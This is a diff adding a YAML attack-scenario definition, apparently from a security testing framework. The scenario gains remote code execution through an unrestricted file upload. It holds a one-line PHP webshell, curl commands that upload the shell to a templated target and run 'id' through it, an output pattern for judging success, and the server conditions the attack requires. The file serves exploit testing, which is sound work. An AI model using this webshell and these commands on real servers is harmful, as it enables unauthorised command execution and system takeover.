@@ -1,0 +1,24 @@
+id: rce_via_webshell
+description: >
+  Achieve remote code execution by uploading a PHP webshell through an unrestricted
+  file upload endpoint, then requesting the uploaded file directly to execute
+  arbitrary OS commands.
+compatible_vuln_patterns:
+  - file_upload_bypass
+success_criteria:
+  description: >
+    After uploading a PHP webshell, an HTTP request to the uploaded file's URL
+    with a cmd parameter returns OS command output in the response body.
+  output_pattern: 'uid=\d+|gid=\d+|www-data|root:'
+test_template: |
+  # Step 1: upload the webshell
+  echo '<?php system($_GET["cmd"]); ?>' > /tmp/goe_shell.php
+  curl -s -F "{{file_parameter}}=@/tmp/goe_shell.php" \
+    "http://target:{{port}}/{{upload_endpoint}}"
+  # Step 2: trigger execution
+  curl -s "http://target:{{port}}/{{upload_dir}}/goe_shell.php?cmd=id" \
+    | grep -E 'uid=[0-9]+'
+notes: >
+  Requires Apache/PHP runtime. The upload directory must be under the webroot
+  and Apache must execute .php files in that directory (no php_admin_flag off).
+  The app must preserve the original file extension (no renaming to .txt).
